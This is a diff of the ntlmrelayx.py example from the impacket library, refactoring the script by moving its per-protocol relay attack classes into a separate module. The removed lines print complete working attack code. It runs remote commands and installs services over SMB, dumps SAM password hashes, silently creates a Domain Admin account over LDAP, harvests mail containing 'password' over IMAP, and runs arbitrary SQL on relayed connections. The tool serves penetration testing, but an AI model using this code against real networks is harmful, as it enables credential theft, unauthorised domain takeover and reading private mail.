+++ examples/ntlmrelayx.py
@@ -34,310 +34,20 @@
 
 import argparse
 import sys
-import thread
 import logging
-import random
-import string
-import re
-import os
 import cmd
 import urllib2
 import json
 from threading import Thread
 
-from impacket import version, smb3, smb
+from impacket import version
 from impacket.examples import logger
-from impacket.examples import serviceinstall
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
-from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
-from impacket.smbconnection import SMBConnection
-from smbclient import MiniImpacketShell
+from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 
-class SMBAttack(Thread):
-    def __init__(self, config, SMBClient, username):
-        Thread.__init__(self)
-        self.daemon = True
-        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
-            self.__SMBConnection = SMBConnection(existingConnection = SMBClient)
-        else:
-            self.__SMBConnection = SMBClient
-        self.config = config
-        self.__answerTMP = ''
-        if self.config.interactive:
-            #Launch locally listening interactive shell
-            self.tcpshell = TcpShell()
-        else:
-            self.tcpshell = None
-            if self.config.exeFile is not None:
-                self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)
-
-    def __answer(self, data):
-        self.__answerTMP += data
-
-    def run(self):
-        # Here PUT YOUR CODE!
-        if self.tcpshell is not None:
-            logging.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
-            #Start listening and launch interactive shell
-            self.tcpshell.listen()
-            self.shell = MiniImpacketShell(self.__SMBConnection,self.tcpshell.socketfile)
-            self.shell.cmdloop()
-            return
-        if self.config.exeFile is not None:
-            result = self.installService.install()
-            if result is True:
-                logging.info("Service Installed.. CONNECT!")
-                self.installService.uninstall()
-        else:
-            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
-            samHashes = None
-            try:
-                # We have to add some flags just in case the original client did not
-                # Why? needed for avoiding INVALID_PARAMETER
-                if  self.__SMBConnection.getDialect() == smb.SMB_DIALECT:
-                    flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
-                    flags2 |= smb.SMB.FLAGS2_LONG_NAMES
-                    self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)
-
-                remoteOps  = RemoteOperations(self.__SMBConnection, False)
-                remoteOps.enableRegistry()
-            except Exception, e:
-                # Something went wrong, most probably we don't have access as admin. aborting
-                logging.error(str(e))
-                return
-
-            try:
-                if self.config.command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.config.command)
-                    logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
-                    self.__answerTMP = ''
-                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                    print self.__answerTMP.decode(self.config.encoding, 'replace')
-                else:
-                    bootKey = remoteOps.getBootKey()
-                    remoteOps._RemoteOperations__serviceDeleted = True
-                    samFileName = remoteOps.saveSAM()
-                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                    samHashes.dump()
-                    samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
-                    logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
-            except Exception, e:
-                logging.error(str(e))
-            finally:
-                if samHashes is not None:
-                    samHashes.finish()
-                if remoteOps is not None:
-                    remoteOps.finish()
-
-#Define global variables to prevent dumping the domain twice
-dumpedDomain = False
-addedDomainAdmin = False
-class LDAPAttack(Thread):
-    def __init__(self, config, LDAPClient, username):
-        Thread.__init__(self)
-        self.daemon = True
-
-        #Import it here because non-standard dependency
-        self.ldapdomaindump = __import__('ldapdomaindump')
-        self.ldap3 = __import__('ldap3')
-        self.client = LDAPClient
-        self.username = username.split('/')[1]
-
-        #Global config
-        self.config = config
-
-    def addDA(self, domainDumper):
-        global addedDomainAdmin
-        if addedDomainAdmin:
-            logging.error('DA already added. Refusing to add another')
-            return
-
-        #Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
-
-        #Random username
-        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
-
-        ucd = {
-            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
-            'distinguishedName': 'CN=%s,CN=Users,%s' % (newUser,domainDumper.root),
-            'cn': newUser,
-            'sn': newUser,
-            'givenName': newUser,
-            'displayName': newUser,
-            'name': newUser,
-            'userAccountControl': 512,
-            'accountExpires': '0',
-            'sAMAccountName': newUser,
-            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
-        }
-
-        res = self.client.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
-        if not res:
-            logging.error('Failed to add a new user: %s' % str(self.client.result))
-        else:
-            logging.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))
-
-        domainsid = domainDumper.getRootSid()
-        dagroupdn = domainDumper.getDAGroupDN(domainsid)
-        res = self.client.modify(dagroupdn, {
-            'member': [(self.ldap3.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
-        if res:
-            logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
-            logging.info('Domain Admin privileges acquired, shutting down...')
-            addedDomainAdmin = True
-            thread.interrupt_main()
-        else:
-            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.result))
-
-    def run(self):
-        #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
-        #print self.client.entries
-        global dumpedDomain
-        #Set up a default config
-        domainDumpConfig = self.ldapdomaindump.domainDumpConfig()
-
-        #Change the output directory to configured rootdir
-        domainDumpConfig.basepath = self.config.lootdir
-
-        #Create new dumper object
-        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
-
-        # If not forbidden by options, check to add a DA
-        if self.config.addda and domainDumper.isDomainAdmin(self.username):
-            logging.info('User is a Domain Admin!')
-            if self.client.server.ssl:
-                self.addDA(domainDumper)
-            else:
-                logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
-        else:
-            # Display this only if we checked it
-            if self.config.addda:
-                logging.info('User is not a Domain Admin')
-            if not dumpedDomain and self.config.dumpdomain:
-                #do this before the dump is complete because of the time this can take
-                dumpedDomain = True
-                logging.info('Dumping domain info for first time')
-                domainDumper.domainDump()
-                logging.info('Domain info dumped into lootdir!')
-
-class HTTPAttack(Thread):
-    def __init__(self, config, HTTPClient, username):
-        Thread.__init__(self)
-        self.daemon = True
-        self.config = config
-        self.client = HTTPClient
-        self.username = username.split('/')[1]
-
-    def run(self):
-        #Default action: Dump requested page to file, named username-targetname.html
-
-        #You can also request any page on the server via self.client.session,
-        #for example with:
-        result = self.client.request("GET", "/")
-        r1 = self.client.getresponse()
-        print r1.status, r1.reason
-        data1 = r1.read()
-        print data1
-
-        #Remove protocol from target name
-        #safeTargetName = self.client.target.replace('http://','').replace('https://','')
-
-        #Replace any special chars in the target name
-        #safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)
-
-        #Combine username with filename
-        #fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
-
-        #Write it to the file
-        #with open(os.path.join(self.config.lootdir,fileName),'w') as of:
-        #    of.write(self.client.lastresult)
-
-class IMAPAttack(Thread):
-    def __init__(self, config, IMAPClient, username):
-        Thread.__init__(self)
-        self.daemon = True
-        self.config = config
-        self.client = IMAPClient
-        self.username = username.split('/')[1]
-
-    def run(self):
-        #Default action: Search the INBOX for messages with "password" in the header or body
-        targetBox = self.config.mailbox
-        result, data = self.client.select(targetBox,True) #True indicates readonly
-        if result != 'OK':
-            logging.error('Could not open mailbox %s: %s' % (targetBox,data))
-            logging.info('Opening mailbox INBOX')
-            targetBox = 'INBOX'
-            result, data = self.client.select(targetBox,True) #True indicates readonly
-        inboxCount = int(data[0])
-        logging.info('Found %s messages in mailbox %s' % (inboxCount,targetBox))
-        #If we should not dump all, search for the keyword
-        if not self.config.dump_all:
-            result, rawdata = self.client.search(None,'OR','SUBJECT','"%s"' % self.config.keyword,'BODY','"%s"' % self.config.keyword)
-            #Check if search worked
-            if result != 'OK':
-                logging.error('Search failed: %s' % rawdata)
-                return
-            dumpMessages = []
-            #message IDs are separated by spaces
-            for msgs in rawdata:
-                dumpMessages += msgs.split(' ')
-            if self.config.dump_max != 0 and len(dumpMessages) > self.config.dump_max:
-                dumpMessages = dumpMessages[:self.config.dump_max]
-        else:
-            #Dump all mails, up to the maximum number configured
-            if self.config.dump_max == 0 or self.config.dump_max > inboxCount:
-                dumpMessages = range(1,inboxCount+1)
-            else:
-                dumpMessages = range(1,self.config.dump_max+1)
-
-        numMsgs = len(dumpMessages)
-        if numMsgs == 0:
-            logging.info('No messages were found containing the search keywords')
-        else:
-            logging.info('Dumping %d messages found by search for "%s"' % (numMsgs,self.config.keyword))
-            for i,msgIndex in enumerate(dumpMessages):
-                #Fetch the message
-                result, rawMessage = self.client.fetch(msgIndex, '(RFC822)')
-                if result != 'OK':
-                    logging.error('Could not fetch message with index %s: %s' % (msgIndex,rawMessage))
-                    continue
-
-                #Replace any special chars in the mailbox name and username
-                mailboxName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', targetBox)
-                textUserName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username)
-
-                #Combine username with mailboxname and mail number
-                fileName = 'mail_' + textUserName + '-' + mailboxName + '_' + str(msgIndex) + '.eml'
-
-                #Write it to the file
-                with open(os.path.join(self.config.lootdir,fileName),'w') as of:
-                    of.write(rawMessage[0][1])
-                logging.info('Done fetching message %d/%d' % (i+1,numMsgs))
-
-        #Close connection cleanly
-        self.client.logout()
-
-class MSSQLAttack(Thread):
-    def __init__(self, config, MSSQLClient, username):
-        Thread.__init__(self)
-        self.config = config
-        self.client = MSSQLClient
-
-    def run(self):
-        if self.config.queries is None:
-            logging.error('No SQL queries specified for MSSQL relay!')
-        else:
-            for query in self.config.queries:
-                logging.info('Executing SQL: %s' % query)
-                self.client.sql_query(query)
-                self.client.printReplies()
-                self.client.printRows()
 
 class MiniShell(cmd.Cmd):
     def __init__(self, relayConfig):
@@ -399,8 +109,6 @@ class MiniShell(cmd.Cmd):
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
-    ATTACKS = {'SMB': SMBAttack, 'LDAP': LDAPAttack, 'LDAPS': LDAPAttack, 'HTTP': HTTPAttack, 'HTTPS': HTTPAttack,
-               'MSSQL': MSSQLAttack, 'IMAP': IMAPAttack, 'IMAPS': IMAPAttack}
 
     # Init the example's logger theme
     logger.init()
@@ -419,7 +127,7 @@ if __name__ == '__main__':
                                                                              'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
-    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient/mssqlclient console instead'
+    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient console instead'
                         'of executing a command after a successful relay. This console will listen locally on a '
                         ' tcp port and can be reached with for example netcat.')
 
@@ -540,7 +248,7 @@ if __name__ == '__main__':
         c.setCommand(options.c)
         c.setEncoding(codec)
         c.setMode(mode)
-        c.setAttacks(ATTACKS)
+        c.setAttacks(PROTOCOL_ATTACKS)
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
         c.setLDAPOptions(options.no_dump,options.no_da)
